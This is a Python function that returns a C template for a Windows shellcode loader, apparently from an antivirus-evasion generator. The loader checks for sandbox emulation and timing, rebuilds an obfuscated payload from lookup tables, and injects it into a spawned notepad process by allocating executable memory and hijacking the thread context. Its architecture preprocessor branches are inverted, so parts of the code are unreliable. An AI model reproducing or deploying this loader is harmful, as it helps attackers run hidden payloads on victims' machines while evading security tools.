###"Technical principle: https://idiotc4t.com/code-and-dll-process-injection/setcontext-hijack-thread"
def get():
    c_code = '''
#include<windows.h>
#include<stdio.h>

<TABLES>
int main(){

        MSG msg;
        DWORD tc;
        PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
        if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
                return 0;

        if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
                return 0;
        tc = GetTickCount();
        Sleep(650);

        if (((GetTickCount() - tc) / 300) != 2)
                return 0;
                
	PCHAR lpBuffer = <ALLOC>
	for (int i = 0; i < sizeof(offset_table)/sizeof(DWORD); i++)
	{
		lpBuffer[i] = random_dict_table[offset_table[i]];
	}
	
	STARTUPINFOA si = { 0 };
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi = {0};

	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
	SuspendThread(pi.hThread);
	LPVOID Buffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(offset_table), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, Buffer, lpBuffer, sizeof(offset_table), NULL);
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_ALL;
	GetThreadContext(pi.hThread, &ctx);
	#ifndef _WIN64
    ctx.Rip = (LONG_PTR)Buffer;
    #else
    ctx.Eip = (LONG_PTR)Buffer;
    #endif
	SetThreadContext(pi.hThread, &ctx);
	ResumeThread(pi.hThread);
	return 0;
}    
'''
    return c_code

